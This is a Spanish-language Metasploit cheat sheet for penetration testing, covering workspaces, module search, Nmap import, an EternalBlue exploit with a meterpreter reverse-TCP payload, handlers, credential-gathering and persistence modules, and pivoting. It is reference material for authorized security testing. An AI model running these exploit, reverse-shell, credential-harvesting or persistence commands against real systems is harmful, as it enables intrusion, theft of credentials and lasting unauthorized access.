
---

# Metasploit — Cheat sheet 

---

## Para iniciar Metasploit

**Acción**

```bash
msfdb run
```

**Explicación**  
Arrancamos la base de datos y msfconsole. Verificamos que se cargan módulos (exploits, payloads, auxiliary, post, etc.) y que la integración con la BBDD local está disponible para persistir hosts, servicios y credenciales.

---

## Crear entornos de trabajo (workspaces)

**Acción**

```bash
workspace
workspace -a metahumo
workspace metahumo
```

**Explicación**  
Creamos y cambiamos entre espacios de trabajo para separar objetivos/engagements. Los datos escaneados e importados se almacenan en el workspace activo.

---

## Búsquedas y filtros

**Acción**

```bash
search <consulta>
search platform:"windows"
search platform:"windows" type:"exploit"
search cve:"CVE-2020-0601"
```

**Explicación**  
Buscamos módulos por plataforma, tipo, IDs (CVE, EDB, BID), autor, etc. Usar `info` sobre el módulo para detalles antes de usarlo.

---

## Usar un módulo y ver opciones

**Acción**

```bash
use auxiliary/scanner/discovery/arp_sweep
show options
info
set RHOSTS 192.168.110.0/24
set THREADS 10
run
```

**Explicación**  
Cargamos el módulo, listamos y completamos opciones requeridas, ejecutamos. Guardamos resultados en el workspace activo.

---

## Integración con Nmap y la DB

**Acción**

```bash
# En terminal externa:
nmap -sC -sV -oX scan_etiqueta.xml 192.168.110.0/24

# En msfconsole:
db_import /ruta/scan_etiqueta.xml
services
hosts
vulns
```

**Explicación**  
Escaneamos con nmap fuera de msf (mejor control y versiones). Importamos el XML para poblar la DB de Metasploit y usar la información en búsquedas y correlaciones.

---

## Trabajar con exploits y payloads (flujo típico)

**Acción**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.0.0.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
exploit -j
```

**Explicación**  
Seleccionamos el exploit, configuramos objetivo y payload (LHOST/LPORT para la conexión inversa), comprobamos con `check` cuando el módulo lo soporte y ejecutamos en background con `-j` si queremos seguir interactuando.

---

## Handler / multi/handler (capturar sesiones)

**Acción**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```

**Explicación**  
Configuramos un handler para recibir shells/reverse sessions generadas por payloads fuera de Metasploit o por plantillas de exploit. Lo ejecutamos como job y luego atendemos la sesión con `sessions -i <id>`.

---

## Gestión de sesiones

**Acción**

```bash
sessions         # lista sesiones activas
sessions -i 1    # interactuar con sesión 1
sessions -k 1    # matar sesión 1
background       # enviar la sesión foreground a background (desde sesión interactiva)
```

**Explicación**  
Mantenemos y gestionamos múltiples sesiones. En meterpreter, usamos comandos propios (sysinfo, ps, migrate, etc.).

---

## Comandos útiles de Meterpreter (post-explotación)

**Ejemplos**

```bash
sysinfo             # info del sistema comprometido
getuid              # usuario actual
ps                  # procesos
migrate <pid>       # migrar a otro proceso
background          # dejar meterpreter en background
download /ruta/archivo
upload localfile /destino/remoto
shell               # drop to a shell on the target
run post/windows/gather/enum_applications
run post/multi/gather/credentials/windows_autologin
```

**Explicación**  
Usamos comandos meterpreter para obtener información, moverse entre procesos, y ejecutar módulos post para recolección de información y (en laboratorio) escalada.

---

## Persistencia y post-explotación

**Acción**

```bash
use post/windows/manage/persistence
set SESSION 1
set LHOST 10.0.0.5
set LPORT 443
run
```

**Explicación**  
En entornos autorizados podemos probar técnicas de persistencia para evaluar el impacto. Documentamos y revertimos siempre en el engagement.

---

## Port forwarding y pivoting

**Acción**

```bash
# Con meterpreter
portfwd add -l 8080 -p 80 -r 192.168.1.100   # local port 8080 -> target 192.168.1.100:80
route add 10.10.0.0/24 1                     # enrutar subred a través de la sesión 1
```

**Explicación**  
Redirigimos puertos y añadimos rutas para acceder a redes internas a través de una sesión comprometida (pivoting).

---

## Recolección y gestión de evidencia en la DB

**Comandos**

```bash
hosts        # ver hosts descubiertos
services     # ver servicios asociados
vulns        # ver vulnerabilidades registradas
creds        # ver credenciales encontradas
loot         # ver archivos descargados/guardados por módulos
db_export -f xml salida_export.xml   # exportar la DB
```

**Explicación**  
Metasploit centraliza información útil del engagement. Exportamos y documentamos para reporting.

---

## Módulos post y scripts útiles

**Ejemplos**

- `post/multi/gather/enum_configs` — recolecta configuraciones comunes.
    
- `post/windows/gather/credentials/*` — intentos de recolección de credenciales (LSASS dumps, SAM, etc.) — usar solo en laboratorio.
    
- `post/multi/manage/shell_to_meterpreter` — convertir una shell en meterpreter cuando es posible.  
    **Explicación**  
    Los módulos `post` nos permiten automatizar tareas de enumeración y recolección después de conseguir acceso.
    

---

## Manejo de credenciales y ataques automatizados

**Comandos**

```bash
creds
creds add <service> <host> <port> <user> <pass>
db_autopwn (obsoleto/evitar)   # *antiguo*; preferir flujos manuales y documentados
```

**Explicación**  
Metasploit almacena credenciales detectadas. Evitamos automatismos peligrosos en entornos productivos; preferimos auditorías controladas.

---

## Recursos y automatización

**Acción**

```bash
resource /ruta/mi_script.rc   # ejecutar comandos desde un archivo .rc
save                         # guardar configuración actual
loadpath /ruta/modulos       # cargar módulos adicionales
```

**Explicación**  
Usamos scripts `.rc` para automatizar pasos repetitivos (escaneos, configuración de handlers, etc.). `save` persiste la configuración.

---

## Logs, debugging y opciones avanzadas

**Comandos / Tips**

- `setg <OPCION> <valor>` — establecemos variables globales (ej. `setg LHOST 10.0.0.5`).
    
- `info -d` — muestra detalles extendidos del módulo.
    
- `check` — si está implementado, verifica si el objetivo es vulnerable sin explotarlo.
    
- `-j` / `-z` con `exploit` para ejecuciones en background y sin interacción.
    
- `set HttpTrace true` — habilitar logging de requests/responses HTTP (útil para debugging de módulos web).  

**Explicación**
Ajustamos comportamiento de msfconsole para pruebas más fiables y reproducibles.
   

---

## Atajos y referencias rápidas

|Acción rápida|Comando|
|---|---|
|Listar sesiones|`sessions`|
|Interactuar sesión|`sessions -i <id>`|
|Poner sesión en background|`background` (desde la sesión)|
|Mostrar opciones módulo|`show options`|
|Información extendida módulo|`info -d`|
|Ejecutar exploit en background|`exploit -j`|
|Importar nmap|`db_import <fichero.xml>`|
|Exportar DB|`db_export -f xml archivo.xml`|
|Buscar módulo|`search <query>`|
|Ejecutar script rc|`resource archivo.rc`|

---

## Ejemplo de flujo mínimo (resumido)

1. Escaneamos externamente con `nmap -oX scan.xml 10.10.10.0/24`.
    
2. Importamos `db_import scan.xml` en msfconsole.
    
3. Buscamos exploits con `search platform:windows type:exploit`.
    
4. Usamos un exploit, configuramos `RHOSTS`, `LHOST`, `PAYLOAD`.
    
5. `check` (si está disponible) y `exploit -j`.
    
6. `sessions -i <id>` → `sysinfo`, `ps`, `migrate`.
    
7. Ejecutamos módulos `post` para enumeración controlada.
    
8. Guardamos evidencias (`loot`, `creds`) y exportamos la DB.
    

---

**Palabras clave para búsqueda de módulos**

| **Palabra clave** | **Descripción**                                                                                                              |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| adapter           | Módulos con un nombre de referencia de adaptador coincidente                                                                 |
| aka               | Módulos con un nombre AKA (también conocido como) coincidente                                                                |
| author            | Módulos escritos por este autor                                                                                              |
| arch              | Módulos que afectan a esta arquitectura                                                                                      |
| bid               | Módulos con un ID de Bugtraq coincidente                                                                                     |
| osvdb             | Módulos con un ID de OSVDB coincidente                                                                                       |
| cve               | Módulos con un ID de CVE coincidente                                                                                         |
| edb               | Módulos con un ID de Exploit-DB coincidente                                                                                  |
| check             | Módulos que soportan el método `check`                                                                                       |
| date              | Módulos con una fecha de divulgación coincidente                                                                             |
| description       | Módulos con una descripción coincidente                                                                                      |
| fullname          | Módulos con un nombre completo coincidente                                                                                   |
| mod_time          | Módulos con una fecha de modificación coincidente                                                                            |
| name              | Módulos con un nombre descriptivo coincidente                                                                                |
| path              | Módulos con una ruta coincidente                                                                                             |
| platform          | Módulos que afectan a esta plataforma/sistema operativo                                                                      |
| port              | Módulos con un puerto coincidente                                                                                            |
| rank              | Módulos con un rango coincidente (puede ser descriptivo, ej. "good", o numérico con operadores de comparación, ej. `gte400`) |
| ref               | Módulos con una referencia coincidente                                                                                       |
| reference         | Módulos con una referencia coincidente                                                                                       |
| session_type      | Módulos con un tipo de sesión coincidente (SMB, MySQL, Meterpreter, etc.)                                                    |
| stage             | Módulos con un nombre de referencia de etapa coincidente                                                                     |
| stager            | Módulos con un nombre de referencia de cargador coincidente                                                                  |
| target            | Módulos que afectan a este objetivo                                                                                          |
| type              | Módulos de un tipo específico (`exploit`, `payload`, `auxiliary`, `encoder`, `evasion`, `post` o `nop`)                      |
| action            | Módulos con un nombre o descripción de acción coincidente                                                                    |

---

**Columnas de búsqueda soportadas**

| **Columna**     | **Descripción**                                                         |
| --------------- | ----------------------------------------------------------------------- |
| rank            | Ordenar módulos por su rango de explotabilidad                          |
| date            | Ordenar módulos por su fecha de divulgación. Alias de `disclosure_date` |
| disclosure_date | Ordenar módulos por su fecha de divulgación                             |
| name            | Ordenar módulos por su nombre                                           |
| type            | Ordenar módulos por su tipo                                             |
| check           | Ordenar módulos según tengan o no el método `check`                     |
| action          | Ordenar módulos según tengan o no acciones                              |

---

## Buenas prácticas y consideraciones éticas

- Trabajamos **siempre** con autorización explícita.
    
- Documentamos cada acción: comandos, outputs, tiempos y evidencias.
    
- Revertimos cambios en el objetivo y limpiamos persistencia tras la prueba.
    
- Evitamos técnicas destructivas salvo que el alcance lo permita y se informe previamente.
    
- Mantener la herramienta actualizada y usar módulos bien documentados.
    

---
